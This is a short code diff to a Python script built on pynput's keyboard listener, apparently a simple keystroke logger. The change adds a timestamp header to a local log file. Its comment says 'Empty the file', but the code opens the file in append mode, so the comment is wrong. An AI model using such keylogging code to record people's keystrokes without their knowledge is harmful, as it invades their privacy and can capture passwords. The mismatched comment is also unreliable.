@@ -1,4 +1,14 @@
 from pynput import keyboard
+import datetime
+
+# Empty the file
+with open("./file.txt", "a") as file:
+    current_datetime = datetime\
+                        .datetime\
+                        .now()\
+                        .strftime("%d/%b/%Y, %I:%M %p")
+    file.write(f"\n\n{current_datetime}\n")
+
 
 def on_press(key):
         try:
